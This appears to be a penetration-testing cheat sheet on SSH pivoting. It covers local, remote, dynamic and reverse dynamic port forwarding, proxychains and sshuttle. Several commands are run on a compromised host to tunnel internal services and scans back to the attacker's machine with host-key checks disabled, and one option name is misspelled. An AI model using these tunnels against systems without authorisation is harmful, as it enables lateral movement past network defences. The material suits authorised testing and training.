# ⭕ SSH Forwarding

## <mark style="color:red;">Local Port Forwarding</mark>

**Forwarding a port from attackers machine to a port on the compromised machine to access a specific port of a target host in the internal network.**

{% hint style="info" %}
No root access needed on compromised machine.
{% endhint %}

#### run this command on your attacking machine:

```
ssh -N -L localhost:localport:targethost:targetport [username@middlehost]
```

* localhost : attackers machine local ip address, usually use 0.0.0.0 for all interfaces.
* local port : port on attackers machine, will be used for connection later
* target host / port : ip and port of the target machine inside the internal network that we want to access
* middlehost : the compromised machine that is going to be used as a pivot point.

#### example for smb port 445:

```
ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```

test the connection:

```
nmap  127.0.0.1 -p 445
```

## <mark style="color:red;">Remote Port Forwarding</mark>

#### The reverse of local port forwarding. a port is opened on the compromised remote machine and the traffic sent to that port is forwarded to attackers local port (ssh client).

{% hint style="danger" %}
**SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024).**

SSH configurations on the attacker machine must allow remote connection to the given user and you have to enter the user password so **don't use the root account on your machine if you don't trust the middle host.**

**I will explain how to secure remote port forwarding connections in a bit.**
{% endhint %}

#### Run this command on the middle host (compromised target).

```
ssh -N -R attackerhost:attackerport:middlehost:middleport [username@attackerhost]
```

{% hint style="info" %}
Port numbers don't have to be the same here.
{% endhint %}

example for MySQL service port 3306:

```
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```

test from attacker machine:

```
nmap -sV 127.0.0.1 -p 2221
```

### <mark style="color:orange;">Secure Remote Port Forwarding</mark>

In situations when you dont trust the middle host (compromised pivot machine) its a huge risk to your security if you use the root account or enter the password in the ssh connection. also if you are running the command in a non-interactive shell you will run into a hurdle .

#### to avoid entering our password and having problems wtih non-interactive shells we can use a few ssh command options.

#### first create a pair of ssh keys to use instead of plain-text password:

```
# on compromised middle host enter:

mkdir keys
cd keys
ssh-keygen
```

#### now the new public key needs to be entered in our attacker host’s authorized\_keys file for the attacker user:

```
# on compromised middle host enter:
cat id_rsa.pub

# copy the public key to your kali machine authorized_keys file with the security options
```

#### To avoid potential security issues we can tighten the ssh configuration only permitting access coming from the middle host IP, then we need to ignore any commands that the user supplies with ssh command options. we also need to prevent agent and x11 forwarding with no-agent-forwarding and no-x11-forwarding options. finally we want to prevent the user from being allocated a tty device with the no-tty option

the final **`~/.ssh/authorized_keys`** file on attacker machine will be like this:

![](<../../.gitbook/assets/image (265).png>)

#### This entry allows the owner of the private key (middle host) to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.

then we have to add some more ssh options:

**-f :** go to background

**-N :** not running commands

**UserKnownHostsFile=/dev/null :** prevent ssh from attempting to save the host key by sending the output to /dev/null

**StrictHostKeyChecking=no** : don't prompt us to accept the host key

#### the final ssh command:

```
ssh -f -N -R attackerhost:attackerport:middlehost:middleport -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i keys/id_rsa user@attackerhost
```

## <mark style="color:red;">Dynamic Forwarding</mark>

#### Allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy. this way we can use all of the ports from the pivot machine.

{% hint style="warning" %}
For this technique to work, we need proxychains or other proxy tools.
{% endhint %}

the syntax is like this:

```
ssh -N -D <attackerhost>:<attackerport> <username>@<middle host>
```

#### With the above syntax in mind, we can create a local SOCKS4 application proxy ( -N -D ) on our attacker machine on TCP port 8080 ( 127.0.0.1:8080 ), which will tunnel all incoming traffic to any host in the target network, through the compromised pivot machine, which we log into.

example:

```
sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
```

#### Now we must somehow direct our reconnaissance and attack tools to use this proxy. We can run any network application through HTTP, SOCKS4, and SOCKS5 proxies with the help of ProxyChains.

#### we simply edit the main configuration file `/etc/proxychains.conf` and add our SOCKS4 proxy to it:

![](<../../.gitbook/assets/image (264) (1).png>)

{% hint style="warning" %}
Make sure that there are no ther proxy IPs in proxychains config file and the specified port is the same as the port in the SSH command.
{% endhint %}

{% hint style="info" %}
By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user’s $(HOME)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs. we can use the -f options with proxychains to specify the path to the configuration file we want to use.
{% endhint %}

#### To run our tools through our SOCKS4 proxy, we prepend each command with proxychains

```
proxychains nmap -sT -Pn -n 192.168.1.110  # must use -sT option
```

{% hint style="warning" %}
**In a dynamic port forwarding we have to use -sT option with nmap to run a full TCP connect scan. other scan methods dont work since we are using a proxy.**
{% endhint %}

## <mark style="color:red;">Reverse Dynamic Forwarding</mark>

#### as of OpenSSH version 7.6 (Released late 2017) SSH clients may generate dynamic reverse tunnels accessible to the server they connect to. What’s really cool is that you don’t need to update your server to version 7.6 before this trick will work. As long as the client supports it, the client enforces it when it completes the connection.

run this command on the compromised remote system (this looks like the remote port forwarding but by not specifying a host after the port the ssh client will create a socks proxy on attackers system):

```
ssh -f -N -R [attackers port] -o "UserKnownHostsFile=/dev/null" -o "StricktHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa   user@[attackers IP]
```

you can check if the port is open on attackers system:

```
netstat -tupln
# look for sshd with local address of 127.0.0.1:[attackers port]
```

​​now edit proxychains configs in /etc/proxychains.conf and add the port:

```
socks4 127.0.0.1 [attackers port]
```

now a stable tunnel is established and we can use proxychains for enumeration and connection:

```
proxychains nmap -sT -Pn [target local IP]
```

{% hint style="warning" %}
SOCKS proxy needs full TCP connection, we cant use other scanning techniques, ICMP can not get through either. use -Pn option.
{% endhint %}

## <mark style="color:red;">SSHuttle</mark>

```
# Transparent proxy over SSH

# Forwarding traffic through the pivot
# It will then auto create necessary iptables rules
sshuttle -r user@pivoting_machine x.x.x.x/24

# You can also let sshuttle detect networks based on the target
# -x == exclude some network to not transmit over the tunnel
sshuttle -vNr user@pivoting_machine -x x.x.x.x.x/24
```
